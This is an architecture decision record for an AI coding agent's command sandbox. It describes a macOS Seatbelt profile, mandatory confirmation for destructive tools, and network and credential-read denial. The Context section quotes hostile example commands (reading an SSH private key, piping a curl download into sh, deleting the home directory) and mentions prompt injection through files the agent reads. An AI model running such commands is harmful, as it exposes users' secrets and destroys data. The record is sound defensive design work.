# ADR 0009 — OS-level command sandbox

- Status: Accepted
- Date: 2026-06-24
- **Amended by ADR 0022** (2026-07-05): the "Network is dev-friendly" section below describes the
  original per-command allow-list, since replaced by network deny-by-default (issue #5). Read that
  paragraph as historical context, not the current behavior.

## Context

`run_command` ran the model's arbitrary string through `sh -c` with **no confinement of the command
itself** — only its `cwd` passed through the `Sandbox`. The path-validation chokepoint (ADR 0002/0008)
and the sensitive-file guard apply to the file tools' validated argv, but the free-form shell bypasses
both: `cat ~/.ssh/id_rsa`, `curl evil | sh`, `rm -rf ~` all ran verbatim. In `auto` mode this ran with
no confirmation; via prompt injection in a file the agent merely reads, it ran unattended. The
"single path chokepoint" invariant was, in practice, false for the shell — the open item that ADR 0002
tracked as OS-level-sandbox `security-debt`.

This ADR records the decision to confine tool child processes at the OS level, plus a separate
approval-layer guarantee, and supersedes that debt.

## Decision

**Two orthogonal layers, kept separate.**

**(A) An OS `CommandSandbox` port confines every tool child process.** A new application-layer port
(`tools/application/command_sandbox.rs`) defines `confine(Command, &SandboxPolicy) -> Command` and
`supports_confinement()`, with pure `SandboxPolicy { root, network, extra_ro, extra_rw }` /
`NetworkPolicy` config types. The adapter **decorates** an already-built `tokio::process::Command`
before the single spawn site in `exec::run`, so the timeout / `kill_on_drop` / piped-stdio plumbing is
untouched. `exec::run_shell` (run_command) and `exec::run_argv` (the file tools) both route through it;
`Sandbox` carries the confiner and builds a per-call policy (workspace root + configured extras + the
approved out-of-root excursion for that call).

**macOS adapter** = a generated Seatbelt (SBPL) profile run via `/usr/bin/sandbox-exec` — a system
binary, **no FFI and no crate**, so the crate-wide `unsafe_code = "forbid"` lint is untouched. The
profile is permissive-base (`allow default`) — the path-policy and confirmation layers remain the
primary guard — and adds only the guarantees they cannot enforce, empirically verified on macOS:
`(deny network*)`; `(deny file-write* (subpath "/"))` re-allowing the workspace root, `/dev`, the temp
dir, and configured extras (so `>/dev/null`, `mktemp`, and builds work); and `(deny file-read* …)` on
credential dirs under `$HOME` (`.ssh`, `.aws`, `.gnupg`, …). Paths are canonicalized (Seatbelt matches
the real path; macOS routes `/var`→`/private/var`, `/tmp`→`/private/tmp`) and SBPL-escaped.
`sandbox-exec` is Apple-deprecated but still shipped; the long-term successor is Endpoint Security.

**Linux adapter** (`landlock` crate for FS path-beneath + ABI-v4 TCP-connect deny, with a
`bwrap --unshare-net` fallback) is designed but **deferred** — it needs a Linux host to verify, and
shipping unverified kernel-confinement code would violate run-to-verify. Linux currently resolves to
the no-op adapter behind the confirmation layer; tracked as `security-debt`.

**Unsupported platforms / opt-out** = `NoConfinement` (identity; `supports_confinement() == false`).

**(B) Destructive tools always confirm, even in auto.** Independently of the OS layer (and the only
guard on platforms without one), the agent loop's `Auto` branch routes through a live confirmation when
the tool is irreversible (`run_command`, `delete_file`, `delete_dir`, `move_path`) or the target is
outside the workspace root. Ordinary in-root mutations (`write_file`, `edit_file`, `create_dir`) and
read-only tools still run unattended in auto. (Shipped in Phase 1.)

**Network is dev-friendly, not all-or-nothing.** `run_command` denies network by default but
auto-allows recognized dev / package-manager commands (`cargo`, `npm`, `git`, … — configurable), and a
session can widen it with `KIRI_SANDBOX_NETWORK=allow`. File tools always deny network. This keeps
`cargo build` / `npm install` fluid while blocking arbitrary exfiltration by default. The residual
supply-chain exposure (a dev command's own build scripts run with network) is accepted and tracked.

**run_command secret boundary.** File tools route every path through the sensitive-name + secret-dir
chokepoint, but `run_command` runs arbitrary shell text, so `cat .env` / `cat ~/.aws/credentials` would
return exactly the material that guard exists to block. The boundary is, in order of strength:

1. **OS confinement (the real control).** The macOS Seatbelt profile read-denies the *single-sourced*
   credential set — the credential dirs (`SECRET_DIRS`), the harness's own `~/.kiri` (holding
   `credentials.json`), and the well-known home credential files (`~/.netrc`, `~/.git-credentials`, …) —
   all derived from one `tools::infrastructure::secret_paths` source shared with the file-tool guard, so
   the two layers cannot drift apart.
2. **Mandatory confirmation.** `run_command` always default-declines, even in `auto` and even in-root.
3. **A best-effort command-text heuristic (UX, not a control).** `references_sensitive_path`
   whitespace-tokenizes the command and, on a hit, prepends a loud warning to the confirmation. It is
   trivially evaded (obfuscation, base64, indirect reads) and **is not sold as a guarantee**; it only
   makes an already-confirmed action scarier and never allows nor denies on its own.

On platforms without OS confinement (Linux/Windows today), `run_command` is **not** secret-guarded at
the OS level: the mandatory confirmation is the sole control, and the heuristic is the only secrets-aware
cue. This is the residual the Linux/Windows adapters (tracked below) will close.

**`unsafe_code = "forbid"` is preserved** via the wrapper binary (and, for Linux, the `landlock`
crate, which encapsulates its own `unsafe`) rather than a hand-written `pre_exec` hook. If `forbid`
ever trips, a single documented `#[allow(unsafe_code)]` scoped to one adapter module only — never
relaxed crate-wide.

**Config (env, fail-fast at boot):** `KIRI_SANDBOX` = `os` (default) | `off` | `require` (refuse
`run_command` when no OS sandbox is available); `KIRI_SANDBOX_NETWORK` = `deny` (default) | `allow`
(the only network control — `KIRI_SANDBOX_NET_ALLOW_CMDS` is gone, see ADR 0022);
`KIRI_SANDBOX_RO_PATHS` / `KIRI_SANDBOX_RW_PATHS` (colon-separated, tilde-expanded). Toolchain dirs
(`~/.cargo`, `~/.rustup`, …) are write-allowed by default so the first build works.

## Consequences

- New `tools/application/command_sandbox.rs` (port) and `tools/infrastructure/confine/{macos,noop}.rs`
  (adapters); `AgentError` gains a `Sandbox` variant (fail-closed). `exec::run_shell`/`run_argv` and
  every file-tool call site gain `(confiner, policy)`; `Sandbox` gains `with_confinement`,
  `confiner`, `network`, `command_policy`, and `Sandbox::new` becomes the test-only unconfined
  shorthand. Composition stays in `app::wire`.
- **Defense-in-depth, not a hermetic jail.** Under `allow default`, a confined command can still do
  most things; the OS layer guarantees only *no outbound network for an untrusted command, no writes
  outside the workspace, and no reads of credential stores*. The path-policy and confirmation layers
  remain the primary controls.
- **Latency.** Each command (and each file-tool op) now spawns through `sandbox-exec`; acceptable for a
  security tool, and `KIRI_SANDBOX=off` is the escape hatch.
- **Platform asymmetry.** macOS is confined; Linux and Windows currently rely on layer (B) +
  path-policy until their adapters land. Documented, not a regression.
- **Closes** ADR 0002's OS-level-sandbox `security-debt` for macOS; **opens** tracked debt for the
  Linux Landlock adapter and Windows OS enforcement.
